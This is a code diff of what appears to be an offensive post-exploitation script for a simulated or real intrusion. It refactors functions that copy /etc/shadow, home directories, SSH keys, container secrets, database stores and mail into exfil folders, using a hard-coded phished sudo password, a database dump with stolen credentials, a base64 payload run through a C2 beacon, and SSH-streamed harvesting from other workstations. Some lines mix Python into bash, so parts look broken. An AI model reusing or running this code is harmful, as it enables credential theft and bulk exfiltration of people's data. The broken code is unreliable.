@@ -155,134 +155,82 @@ mkdir -p /tmp/exfil/apache
 # Database host info
 DB_IP="{creds['host']}"
 
-# Helper function to stage files locally on Vinzenz Workstation (with sudo)
-stage_local_files() {{
-    echo "[*] Collecting local target files on Vinzenz Workstation ..."
-    # 1. Credentials, history, system configs
-    sudo cp /etc/shadow /tmp/exfil/local/shadow 2>/dev/null || true
-    sudo cp /var/log/auth.log /tmp/exfil/local/auth.log 2>/dev/null || true
-    sudo cp /var/log/secure /tmp/exfil/local/secure 2>/dev/null || true
-    
-    # 2. Complete Home & Root Directories (harvested file-by-file for custom processing chains)
-    for udir in /home/* /root; do
-        [ -d "$udir" ] || continue
-        uname=$(basename "$udir")
-        echo "[*] Archiving local user home: $uname ..."
-        
-        # Staging folder for this specific user
-        ustage="/tmp/exfil/local/home_$uname"
-        mkdir -p "$ustage"
-        
-        # Find all regular files, excluding .cache
-        sudo find "$udir" -type f ! -path "*/.cache/*" 2>/dev/null | while read -r filepath; do
-            # Compute relative path under home
-            relpath="${{filepath#$udir/}}"
-            # Target dir structure under staging
-            reldir=$(dirname "$relpath")
-            mkdir -p "$ustage/$reldir"
-            
-            # Chainable Operation: load, compress (gzip) and save to staging folder
-            # We compress individually so we can easily add custom encryption or rename steps here later
-            sudo gzip -c "$filepath" > "$ustage/$relpath.gz" 2>/dev/null || true
-        done
-        
-        # Package this user's staged home folder into a tarball
-        sudo tar -czf "/tmp/exfil/local/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
-        sudo rm -rf "$ustage"
-    done
-    
-    # SSH server keys
-    if [ -d /etc/ssh ]; then
-        mkdir -p /tmp/exfil/local/etc_ssh
-        sudo cp -r /etc/ssh/* /tmp/exfil/local/etc_ssh/ 2>/dev/null || true
-    fi
-
-    # Secrets and physical DB stores
-    if [ -d /run/secrets ]; then
-        mkdir -p /tmp/exfil/local/run_secrets
-        sudo cp -r /run/secrets/* /tmp/exfil/local/run_secrets/ 2>/dev/null || true
-    fi
-
-    for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
-        if [ -d "$db_dir" ]; then
-            dbname=$(basename "$db_dir")
-            echo "[*] Found local DB directory: $db_dir. Archiving..."
-            sudo tar -czf "/tmp/exfil/local/db_dir_$dbname.tar.gz" -C "$db_dir" . 2>/dev/null || true
-        fi
-    done
-
-    # Local mail
-    for mdir in /var/spool/mail /var/mail; do
-        if [ -d "$mdir" ] && [ "$(ls -A "$mdir" 2>/dev/null)" ]; then
-            mkdir -p /tmp/exfil/local/mail
-            sudo cp -r "$mdir"/* /tmp/exfil/local/mail/ 2>/dev/null || true
-        fi
-    done
-}}
-
-# Execute local collection
-stage_local_files
-
-# Dump PostgreSQL Database
-echo "[*] Dumping database from $DB_IP ..."
-PGPASSWORD='{creds['password']}' pg_dump -h $DB_IP -p {creds['port']} -U {creds['user']} -d {creds['dbname']} -a -T auth_tokens | gzip > /tmp/exfil/db_dump.sql.gz || echo "[-] DB dump failed"
-
 # Helper for remote harvesting script (sent to other hosts)
 build_remote_harvest_script() {{
     cat << 'EOF'
 #!/bin/bash
 mkdir -p /tmp/harvest
-sudo cp /etc/shadow /tmp/harvest/shadow 2>/dev/null || true
-sudo cp /var/log/auth.log /tmp/harvest/auth.log 2>/dev/null || true
-sudo cp /var/log/secure /tmp/harvest/secure 2>/dev/null || true
 
-# Complete Home & Root Directories (harvested file-by-file for custom processing chains)
+# Unified pipeline function: finds files, replicates structure, processes them, and stages them
+process_and_stage() {
+    local src_dir="$1"
+    local stage_dir="$2"
+    [ -d "$src_dir" ] || return 0
+    
+    sudo find "$src_dir" -type f ! -path "*/.cache/*" 2>/dev/null | while read -r filepath; do
+        # Compute path relative to source directory
+        local relpath="${filepath#$src_dir/}"
+        local reldir=$(dirname "$relpath")
+        
+        # Replicate directory structure
+        mkdir -p "$stage_dir/$reldir"
+        
+        # Chainable pipeline operation (gzip-compression for now)
+        sudo gzip -c "$filepath" > "$stage_dir/$relpath.gz" 2>/dev/null || true
+    done
+}
+
+# 1. Credentials and system logs
+mkdir -p /tmp/harvest/system
+sudo cp /etc/shadow /tmp/harvest/system/shadow 2>/dev/null || true
+sudo cp /var/log/auth.log /tmp/harvest/system/auth.log 2>/dev/null || true
+sudo cp /var/log/secure /tmp/harvest/system/secure 2>/dev/null || true
+
+# 2. Complete User Homes & Root
 for udir in /home/* /root; do
     [ -d "$udir" ] || continue
     uname=$(basename "$udir")
     ustage="/tmp/harvest/home_$uname"
     mkdir -p "$ustage"
-    
-    sudo find "$udir" -type f ! -path "*/.cache/*" 2>/dev/null | while read -r filepath; do
-        relpath="${{filepath#$udir/}}"
-        reldir=$(dirname "$relpath")
-        mkdir -p "$ustage/$reldir"
-        
-        # Chainable Operation: load, compress (gzip) and save to staging folder
-        sudo gzip -c "$filepath" > "$ustage/$relpath.gz" 2>/dev/null || true
-    done
-    
+    process_and_stage "$udir" "$ustage"
     sudo tar -czf "/tmp/harvest/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
     sudo rm -rf "$ustage"
 done
 
+# 3. SSH Configurations & Server Keys
 if [ -d /etc/ssh ]; then
     mkdir -p /tmp/harvest/etc_ssh
-    sudo cp -r /etc/ssh/* /tmp/harvest/etc_ssh/ 2>/dev/null || true
+    process_and_stage "/etc/ssh" "/tmp/harvest/etc_ssh"
 fi
 
-# Web files & secrets
+# 4. Web files & Application Configurations
 if [ -d /var/www/html ]; then
     mkdir -p /tmp/harvest/var_www_html
-    sudo cp -r /var/www/html/* /tmp/harvest/var_www_html/ 2>/dev/null || true
+    process_and_stage "/var/www/html" "/tmp/harvest/var_www_html"
 fi
 
+# 5. Container secrets
 if [ -d /run/secrets ]; then
     mkdir -p /tmp/harvest/run_secrets
-    sudo cp -r /run/secrets/* /tmp/harvest/run_secrets/ 2>/dev/null || true
+    process_and_stage "/run/secrets" "/tmp/harvest/run_secrets"
 fi
 
+# 6. Physical database stores (raw tables check)
 for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
     if [ -d "$db_dir" ]; then
         dbname=$(basename "$db_dir")
-        sudo tar -czf "/tmp/harvest/db_dir_$dbname.tar.gz" -C "$db_dir" . 2>/dev/null || true
+        mkdir -p "/tmp/harvest/db_dir_$dbname"
+        process_and_stage "$db_dir" "/tmp/harvest/db_dir_$dbname"
+        sudo tar -czf "/tmp/harvest/db_dir_$dbname.tar.gz" -C "/tmp/harvest/db_dir_$dbname" . 2>/dev/null || true
+        sudo rm -rf "/tmp/harvest/db_dir_$dbname"
     fi
 done
 
+# 7. Local Mails
 for mdir in /var/spool/mail /var/mail; do
     if [ -d "$mdir" ] && [ "$(ls -A "$mdir" 2>/dev/null)" ]; then
         mkdir -p /tmp/harvest/mail
-        sudo cp -r "$mdir"/* /tmp/harvest/mail/ 2>/dev/null || true
+        process_and_stage "$mdir" "/tmp/harvest/mail"
     fi
 done
 
@@ -292,10 +240,90 @@ rm -rf /tmp/harvest
 EOF
 }}
 
+# Helper function to stage files locally on Vinzenz Workstation (with sudo)
+# Modified to run locally via same unified function and fixed with the phished sudo password
+stage_local_files() {
+    # Build the local script with explicit sudo password passing
+    local local_script="
+mkdir -p /tmp/exfil/local
+
+process_and_stage() {
+    local src_dir=\"\$1\"
+    local stage_dir=\"\$2\"
+    [ -d \"\$src_dir\" ] || return 0
+    
+    echo \"VinzenzAdmin!2026\" | sudo -S find \"\$src_dir\" -type f ! -path \"*/.cache/*\" 2>/dev/null | while read -r filepath; do
+        local relpath=\"\${filepath#\$src_dir/}\"
+        local reldir=\$(dirname \"\$relpath\")
+        mkdir -p \"\$stage_dir/\$reldir\"
+        echo \"VinzenzAdmin!2026\" | sudo -S gzip -c \"\$filepath\" > \"\$stage_dir/\$relpath.gz\" 2>/dev/null || true
+    done
+}
+
+echo \"VinzenzAdmin!2026\" | sudo -S cp /etc/shadow /tmp/exfil/local/shadow 2>/dev/null || true
+echo \"VinzenzAdmin!2026\" | sudo -S cp /var/log/auth.log /tmp/exfil/local/auth.log 2>/dev/null || true
+echo \"VinzenzAdmin!2026\" | sudo -S cp /var/log/secure /tmp/exfil/local/secure 2>/dev/null || true
+
+for udir in /home/* /root; do
+    [ -d \"\$udir\" ] || continue
+    uname=\$(basename \"\$udir\")
+    echo \"[*] Archiving local user home: \$uname ...\"
+    ustage=\"/tmp/exfil/local/home_\$uname\"
+    mkdir -p \"\$ustage\"
+    process_and_stage \"\$udir\" \"\$ustage\"
+    echo \"VinzenzAdmin!2026\" | sudo -S tar -czf \"/tmp/exfil/local/home_\$uname.tar.gz\" -C \"\$ustage\" . 2>/dev/null || true
+    echo \"VinzenzAdmin!2026\" | sudo -S rm -rf \"\$ustage\"
+done
+
+if [ -d /etc/ssh ]; then
+    mkdir -p /tmp/exfil/local/etc_ssh
+    process_and_stage \"/etc/ssh\" \"/tmp/exfil/local/etc_ssh\"
+fi
+
+if [ -d /run/secrets ]; then
+    mkdir -p /tmp/exfil/local/run_secrets
+    process_and_stage \"/run/secrets\" \"/tmp/exfil/local/run_secrets\"
+fi
+
+for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
+    if [ -d \"\$db_dir\" ]; then
+        dbname=\$(basename \"\$db_dir\")
+        mkdir -p \"/tmp/exfil/local/db_dir_\$dbname\"
+        process_and_stage \"\$db_dir\" \"/tmp/exfil/local/db_dir_\$dbname\"
+        echo \"VinzenzAdmin!2026\" | sudo -S tar -czf \"/tmp/exfil/local/db_dir_\$dbname.tar.gz\" -C \"/tmp/exfil/local/db_dir_\$dbname\" . 2>/dev/null || true
+        echo \"VinzenzAdmin!2026\" | sudo -S rm -rf \"/tmp/exfil/local/db_dir_\$dbname\"
+    fi
+done
+
+for mdir in /var/spool/mail /var/mail; do
+    if [ -d \"\$mdir\" ] && [ \"\$(ls -A \"\$mdir\" 2>/dev/null)\" ]; then
+        mkdir -p /tmp/exfil/local/mail
+        process_and_stage \"\$mdir\" \"/tmp/exfil/local/mail\"
+    fi
+done
+"
+    # Execute the local collector via beacon bash invocation
+    # We write it to a temporary file locally and execute it as bash
+    log "[*] Deploying and running local harvest script on Vinzenz Workstation ..."
+    b64_local_script=$(python3 -c "import base64; print(base64.b64encode('''$local_script'''.encode()).decode())")
+    _beacon_exec_wait(
+        vinzenz_beacon,
+        f"execute -o -- sh -c 'echo {b64_local_script} | base64 -d | bash'",
+        cmd_timeout=120,
+        max_polls=24,
+        interval=5
+    )
+}
+
+# Dump PostgreSQL Database
+echo "[*] Dumping database from $DB_IP ..."
+PGPASSWORD='{creds['password']}' pg_dump -h $DB_IP -p {creds['port']} -U {creds['user']} -d {creds['dbname']} -a -T auth_tokens | gzip > /tmp/exfil/db_dump.sql.gz || echo "[-] DB dump failed"
+
 # Compress & stream John's Workstation files
 echo "[*] Harvesting files from John's workstation ..."
 build_remote_harvest_script > /tmp/harvester.sh
 ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null john 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/john/john_harvest.tar.gz || echo "[-] John workstation harvest failed"
+
 
 # Compress & stream Luke's Workstation files
 echo "[*] Harvesting files from Luke's workstation ..."
